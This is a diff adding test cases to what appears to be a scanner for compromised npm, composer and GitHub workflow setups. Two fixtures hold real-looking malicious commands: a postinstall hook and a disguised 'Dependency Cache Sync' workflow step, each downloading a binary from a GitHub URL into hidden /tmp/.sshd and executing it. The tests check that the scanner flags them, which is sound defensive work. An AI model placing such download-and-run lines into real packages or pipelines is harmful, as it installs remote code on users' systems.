@@ -109,6 +109,25 @@ try {
   fs.rmSync(tmpLaravelLangRoot, { recursive: true, force: true });
 }
 
+const tmpDevdojoComposerRoot = fs.mkdtempSync(path.join(__dirname, "tmp-devdojo-composer-"));
+try {
+  fs.writeFileSync(
+    path.join(tmpDevdojoComposerRoot, "composer.lock"),
+    JSON.stringify({
+      packages: [
+        { name: "devdojo/wave", version: "dev-main" },
+        { name: "devdojo/genesis", version: "3.x-dev" }
+      ]
+    }, null, 2)
+  );
+  const devdojoReview = scanTarget(tmpDevdojoComposerRoot);
+  assert.strictEqual(devdojoReview.risk, "review-needed");
+  assert(devdojoReview.findings.some((finding) => finding.type === "composer-package-review-prompt" && finding.message.includes("package.json")));
+  assert(!devdojoReview.findings.some((finding) => finding.type === "known-bad-composer-version"));
+} finally {
+  fs.rmSync(tmpDevdojoComposerRoot, { recursive: true, force: true });
+}
+
 const tmpSquawkRoot = fs.mkdtempSync(path.join(__dirname, "tmp-squawk-"));
 try {
   fs.writeFileSync(
@@ -204,6 +223,26 @@ try {
   fs.rmSync(tmpAntvPayloadRoot, { recursive: true, force: true });
 }
 
+const tmpDevdojoPayloadRoot = fs.mkdtempSync(path.join(__dirname, "tmp-devdojo-payload-"));
+try {
+  fs.writeFileSync(
+    path.join(tmpDevdojoPayloadRoot, "package.json"),
+    JSON.stringify({
+      scripts: {
+        postinstall: "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/download/v1/systemd-network-helper -o /tmp/.sshd >/dev/null 2>&1 && chmod +x /tmp/.sshd && /tmp/.sshd >/dev/null 2>&1 &"
+      }
+    }, null, 2)
+  );
+  const devdojoPayload = scanTarget(tmpDevdojoPayloadRoot);
+  assert.strictEqual(devdojoPayload.risk, "likely-exposed");
+  assert(devdojoPayload.findings.some((finding) => finding.type === "payload-reference"));
+  assert(devdojoPayload.findings.some((finding) => finding.type === "network-indicator"));
+  assert(devdojoPayload.findings.some((finding) => finding.type === "campaign-indicator"));
+  assert(devdojoPayload.findings.some((finding) => finding.type === "lifecycle-script"));
+} finally {
+  fs.rmSync(tmpDevdojoPayloadRoot, { recursive: true, force: true });
+}
+
 const tmpConfigRoot = fs.mkdtempSync(path.join(__dirname, "tmp-config-"));
 try {
   fs.mkdirSync(path.join(tmpConfigRoot, ".claude"));
@@ -242,6 +281,31 @@ try {
   assert(megalodonWorkflow.findings.some((finding) => finding.type === "workflow-token-surface"));
 } finally {
   fs.rmSync(tmpMegalodonWorkflowRoot, { recursive: true, force: true });
+}
+
+const tmpDevdojoWorkflowRoot = fs.mkdtempSync(path.join(__dirname, "tmp-devdojo-workflow-"));
+try {
+  fs.mkdirSync(path.join(tmpDevdojoWorkflowRoot, ".github", "workflows"), { recursive: true });
+  fs.writeFileSync(
+    path.join(tmpDevdojoWorkflowRoot, ".github", "workflows", "cache.yml"),
+    [
+      "name: Dependency Cache Sync",
+      "on: [push]",
+      "jobs:",
+      "  sync:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - name: Dependency Cache Sync",
+      "        run: curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/raw/main/helper -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd"
+    ].join("\n")
+  );
+  const devdojoWorkflow = scanTarget(tmpDevdojoWorkflowRoot);
+  assert.strictEqual(devdojoWorkflow.risk, "possible-exposure");
+  assert(devdojoWorkflow.findings.some((finding) => finding.type === "workflow-indicator"));
+  assert(devdojoWorkflow.findings.some((finding) => finding.type === "network-indicator"));
+  assert(devdojoWorkflow.findings.some((finding) => finding.type === "workflow-encoded-exec"));
+} finally {
+  fs.rmSync(tmpDevdojoWorkflowRoot, { recursive: true, force: true });
 }
 
 const payloadPath = path.join(__dirname, "fixtures", "compromised", "router_init.js");
